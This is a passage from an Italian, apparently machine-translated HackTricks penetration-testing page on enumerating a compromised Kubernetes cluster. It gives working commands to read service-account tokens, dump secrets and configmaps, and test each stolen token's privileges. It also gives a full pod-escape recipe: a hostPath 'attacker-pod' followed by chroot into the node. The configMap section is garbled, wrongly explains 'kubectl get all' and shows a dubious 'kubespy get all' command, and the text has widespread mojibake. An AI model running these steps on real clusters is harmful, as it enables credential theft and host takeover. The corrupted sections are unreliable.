# Enumerazione di Kubernetes

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di github.

</details>

## Token di Kubernetes

Se hai accesso compromesso a una macchina, l'utente potrebbe avere accesso a una piattaforma Kubernetes. Il token di solito si trova in un file indicato dalla variabile d'ambiente **`KUBECONFIG`** o **all'interno di `~/.kube`**.

In questa cartella potresti trovare file di configurazione con **token e configurazioni per connettersi al server API**. In questa cartella puoi anche trovare una cartella di cache con informazioni precedentemente recuperate.

Se hai compromesso un pod all'interno di un ambiente Kubernetes, ci sono altri posti in cui puoi trovare token e informazioni sull'attuale ambiente K8:

### Token dell'account di servizio

Prima di continuare, se non sai cos'√® un servizio in Kubernetes ti consiglio di **seguire questo link e leggere almeno le informazioni sull'architettura di Kubernetes**.

Preso dalla [documentazione](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) di Kubernetes:

_"Quando crei un pod, se non specifici un account di servizio, viene assegnato automaticamente l'account di servizio predefinito nello stesso namespace."_

**ServiceAccount** √® un oggetto gestito da Kubernetes e utilizzato per fornire un'identit√† ai processi che vengono eseguiti in un pod.\
Ogni account di servizio ha un segreto ad esso correlato e questo segreto contiene un token di autenticazione. Questo √® un JSON Web Token (JWT), un metodo per rappresentare in modo sicuro le richieste tra due parti.

Di solito **una** delle seguenti directory:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

contengono i file:

* **ca.crt**: √à il certificato ca per verificare le comunicazioni di Kubernetes
* **namespace**: Indica il namespace corrente
* **token**: Contiene il **token di servizio** del pod corrente.

Ora che hai il token, puoi trovare il server API all'interno della variabile d'ambiente **`KUBECONFIG`**. Per ulteriori informazioni esegui `(env | set) | grep -i "kuber|kube`**`"`**

Il token dell'account di servizio viene firmato dalla chiave presente nel file **sa.key** e convalidato da **sa.pub**.

Posizione predefinita su **Kubernetes**:

* /etc/kubernetes/pki

Posizione predefinita su **Minikube**:

* /var/lib/localkube/certs

### Pod attivi

_I **pod attivi**_ sono pod che contengono un token di account di servizio privilegiato. Un token di account di servizio privilegiato √® un token che ha il permesso di eseguire attivit√† privilegiate come elencare segreti, creare pod, ecc.

## RBAC

Se non sai cos'√® **RBAC**, **leggi questa sezione**.

## CheatSheet di enumerazione

Per enumerare un ambiente K8s hai bisogno di un paio di cose:

* Un **token di autenticazione valido**. Nella sezione precedente abbiamo visto dove cercare un token utente e un token di account di servizio.
* L'**indirizzo (**_**https://host:port**_**) dell'API di Kubernetes**. Questo pu√≤ essere trovato di solito nelle variabili d'ambiente e/o nel file di configurazione kube.
* **Opzionale**: Il **ca.crt per verificare il server API**. Questo pu√≤ essere trovato negli stessi posti in cui pu√≤ essere trovato il token. Questo √® utile per verificare il certificato del server API, ma utilizzando `--insecure-skip-tls-verify` con `kubectl` o `-k` con `curl` non avrai bisogno di questo.

Con questi dettagli puoi **enumerare Kubernetes**. Se l'**API** per qualche motivo √® **accessibile** tramite **Internet**, puoi semplicemente scaricare quelle informazioni ed enumerare la piattaforma dal tuo host.

Tuttavia, di solito il **server API √® all'interno di una rete interna**, quindi dovrai **creare un tunnel** attraverso la macchina compromessa per accedervi dalla tua macchina, oppure puoi **caricare il** [**binario kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux), o utilizzare **`curl/wget/qualsiasi cosa`** per eseguire richieste HTTP grezze al server API.

### Differenze tra i verbi `list` e `get`

Con i permessi di **`get`** puoi accedere alle informazioni di risorse specifiche (_opzione `describe` in `kubectl`_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Se hai il permesso **`list`**, sei autorizzato a eseguire richieste API per elencare un tipo di risorsa (_opzione `get` in `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Se hai il permesso **`watch`**, sei autorizzato a eseguire richieste API per monitorare le risorse:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Apri una connessione di streaming che restituisce l'intero manifesto di un Deployment ogni volta che viene modificato (o quando ne viene creato uno nuovo).

{% hint style="danger" %}
I seguenti comandi `kubectl` indicano solo come elencare gli oggetti. Se desideri accedere ai dati, devi utilizzare `describe` invece di `get`.
{% endhint %}

### Utilizzando curl

Da all'interno di un pod puoi utilizzare diverse variabili di ambiente:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Per impostazione predefinita, il pod pu√≤ **accedere** al **server kube-api** nel nome di dominio **`kubernetes.default.svc`** e puoi vedere la rete kube in **`/etc/resolv.config`** poich√© qui troverai l'indirizzo del server DNS di Kubernetes (il ".1" dello stesso intervallo √® il punto finale kube-api).
{% endhint %}

### Utilizzando kubectl

Avendo il token e l'indirizzo del server API, √® possibile utilizzare kubectl o curl per accedervi come indicato qui:

Per impostazione predefinita, il SERVERAPI comunica con lo schema `https://`
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> se non c'√® `https://` nell'URL, potresti ottenere un errore come Bad Request.

Puoi trovare una [**cheatsheet ufficiale di kubectl qui**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). Lo scopo delle seguenti sezioni √® presentare in modo ordinato diverse opzioni per enumerare e comprendere il nuovo K8s a cui hai ottenuto accesso.

Per trovare la richiesta HTTP che `kubectl` invia, puoi utilizzare il parametro `-v=8`

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Configurazione attuale

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Se sei riuscito a rubare le credenziali di alcuni utenti, puoi **configurarle localmente** utilizzando qualcosa del genere:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Ottenere le risorse supportate

Con queste informazioni saprai tutti i servizi che puoi elencare

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### Ottenere i privilegi correnti

{% tabs %}
{% tab title="kubectl" %}Per ottenere i privilegi correnti, esegui il comando:

```bash
kubectl auth can-i <verb> <resource>
```

Sostituisci `<verb>` con il verbo che desideri controllare (ad esempio `get`, `create`, `delete`, ecc.) e `<resource>` con la risorsa che desideri controllare (ad esempio `pods`, `deployments`, `services`, ecc.).

Ad esempio, per verificare se hai il permesso di ottenere i pod, esegui:

```bash
kubectl auth can-i get pods
```

Se hai i privilegi, riceverai un messaggio di conferma. Altrimenti, riceverai un messaggio di errore che indica che non hai i privilegi necessari.
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Un altro modo per verificare i tuoi privilegi √® utilizzare lo strumento: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

Puoi saperne di pi√π su **Kubernetes RBAC** in:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Una volta che sai quali privilegi** hai, controlla la seguente pagina per capire **se puoi abusarne** per ottenere privilegi elevati:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Ottenere altri ruoli

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Ottieni i namespace

Kubernetes supporta **cluster virtuali multipli** supportati dallo stesso cluster fisico. Questi cluster virtuali sono chiamati **namespace**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### Ottenere segreti

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Se puoi leggere i segreti, puoi utilizzare le seguenti linee per ottenere i privilegi correlati a ciascun token:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Ottenere gli account di servizio

Come discusso all'inizio di questa pagina, **quando viene eseguito un pod, di solito viene assegnato un account di servizio**. Pertanto, elencare gli account di servizio, i loro permessi e dove vengono eseguiti potrebbe consentire a un utente di ottenere privilegi elevati.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### Ottieni Deployments

I deployments specificano i **componenti** che devono essere **eseguiti**.

{% tabs %}
{% tab title="kubectl" %}
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Ottenere i Pods

I Pods sono i **contenitori** effettivi che verranno **eseguiti**.

{% tabs %}
{% tab title="kubectl" %}
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Ottenere i servizi

I **servizi** di Kubernetes vengono utilizzati per **esporre un servizio su una porta e un indirizzo IP specifici** (che fungeranno da bilanciatore di carico per i pod che offrono effettivamente il servizio). Questo √® interessante da sapere per individuare altri servizi su cui tentare un attacco.

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### Ottenere i nodi

Ottieni tutti i **nodi configurati all'interno del cluster**.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Ottenere i DaemonSets

**DaeamonSets** permette di garantire che un **pod specifico sia in esecuzione in tutti i nodi** del cluster (o in quelli selezionati). Se si elimina il DaemonSet, i pod gestiti da esso verranno anche rimossi.

{% tabs %}
{% tab title="kubectl" %}
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Ottieni cronjob

I cron job consentono di pianificare l'avvio di un pod che eseguir√† un'azione utilizzando una sintassi simile a crontab. 

{% tabs %}
{% tab title="kubectl" %}
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### Ottieni configMap

configMap contiene sempre molte informazioni e file di configurazione che vengono forniti alle applicazioni che vengono eseguite in Kubernetes. Di solito √® possibile trovare molte password, segreti e token che vengono utilizzati per connettersi e convalidare altri servizi interni/esterni. 

{% tabs %}

{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% tab title="kubectl" %}

Per ottenere tutte le risorse di un tipo specifico, √® possibile utilizzare il comando `kubectl get all`. Tuttavia, questo comando non restituir√† tutte le risorse disponibili nel cluster, ma solo quelle che sono state create utilizzando il tipo di risorsa "all".

```bash
kubectl get all
```

Questo comando restituir√† un elenco di tutte le risorse create nel cluster, inclusi i pod, i servizi, i volumi persistenti, i segreti, le configurazioni e altro ancora.

{% endtab %}

{% tab title="kubespy" %}

Per ottenere tutte le risorse di un tipo specifico, √® possibile utilizzare il comando `kubespy get all`. Tuttavia, questo comando non restituir√† tutte le risorse disponibili nel cluster, ma solo quelle che sono state create utilizzando il tipo di risorsa "all".

```bash
kubespy get all
```

Questo comando restituir√† un elenco di tutte le risorse create nel cluster, inclusi i pod, i servizi, i volumi persistenti, i segreti, le configurazioni e altro ancora.

{% endtab %}
{% endtabs %}
```
k get all
```
{% endtab %}
{% endtabs %}

### **Ottieni il consumo dei Pods**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Fuga dal pod

Se sei in grado di creare nuovi pod, potresti essere in grado di fuggire da essi verso il nodo. Per farlo, devi creare un nuovo pod utilizzando un file yaml, passare al pod creato e quindi chroot nel sistema del nodo. Puoi utilizzare i pod gi√† esistenti come riferimento per il file yaml poich√© mostrano immagini e percorsi esistenti.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> se hai bisogno di creare un pod su un nodo specifico, puoi utilizzare il seguente comando per ottenere le etichette del nodo
>
> `k get nodes --show-labels`
>
> Comunemente, kubernetes.io/hostname e node-role.kubernetes.io/master sono entrambe buone etichette per la selezione.
>
> [riferimento]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

Poi crea il tuo file attack.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[sorgente yaml originale](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Dopo di ci√≤, crei il pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Ora puoi passare al pod creato come segue
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
E infine, esegui il chroot nel sistema del nodo
```bash
chroot /root /bin/bash
```
Informazioni ottenute da: [Kubernetes Namespace Breakout usando Insecure Host Path Volume - Parte 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attaccare e difendere Kubernetes: Bust-A-Kube - Episodio 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Riferimenti

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di github.

</details>
